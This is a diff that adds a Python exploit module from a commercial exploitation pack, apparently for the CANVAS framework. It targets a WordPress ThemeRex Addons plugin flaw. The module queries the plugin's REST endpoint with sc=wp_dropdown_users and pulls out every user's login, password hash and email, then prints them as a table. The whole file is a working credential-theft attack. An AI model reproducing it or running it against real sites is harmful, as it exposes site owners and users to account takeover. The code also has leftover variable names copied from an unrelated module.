@@ -1,0 +1,155 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2020
+#
+
+import sys
+import time
+import os
+import random
+import base64
+import io
+import zipfile
+import re
+import urllib
+import json
+import requests
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "WordPress Plugin ThemeRex Addons User Credentials Disclosure Vulnerability"
+
+DESCRIPTION = "User name, password and email disclosure vulnerability in WordPress plugin ThemeRex Addons"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ThemeRex"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["Date public"] = "2020.02.18"
+DOCUMENTATION["References"] = "https://mp.weixin.qq.com/s/W4PbykSWJ1f1c-loOjrclg"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown" 
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.vhost = ""        
+    self.basepath = ""    
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 0
+    self.name = NAME
+    return
+	
+  def request(self, cmd):                   
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport    
+    url = "wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&show=user_%s"%cmd        
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.vhost, self.port, self.basepath, url)                           
+    response = requests.get(mainurl)        
+    m = re.findall('<option value=\'(\\d+)\'>([^<]+)</option>', response.text)        
+    return m
+                    
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)     
+    self.vhost = self.argsDict.get("vhost", self.vhost)
+
+  def prettyprint(self):
+      self.wp_users.insert(0, ("User", "Password", "Email"))
+      remap = zip(*self.wp_users)
+      max_len = max(map(len,remap[0]))
+      max_len2 = max(map(len,remap[1]))
+      max_len3 = max(map(len,remap[2]))
+      string = ""
+      for (plugin, curr_version, latest_version) in self.wp_users:
+          string += ("%*s | %*s | %*s\n" % (-max_len, plugin, -max_len2, curr_version, -max_len3, latest_version))
+      self.log_info("\n%s" % string)
+
+  def run(self):
+    users = {}
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+         
+    logins = self.request('login')
+    if logins is not None:
+        for login in logins:
+            if not login[0] in users:
+                users[login[0]] = {}
+            users[login[0]]['login'] = login[1]                                    
+
+    passwords = self.request('pass')
+    if passwords is not None:
+        for password in passwords:
+            if not password[0] in users:
+                users[password[0]] = {}
+            users[password[0]]['pass'] = password[1]
+            
+    emails = self.request('email')
+    if emails is not None:
+        for email in emails:
+            if not email[0] in users:
+                users[email[0]] = {}
+            users[email[0]]['email'] = email[1]
+            
+    self.wp_users = []
+    for k,v in users.iteritems():
+        self.wp_users.append((v['login'],v['pass'],v['email']))                                                        
+
+    self.prettyprint()                                                
+            
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return 1
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
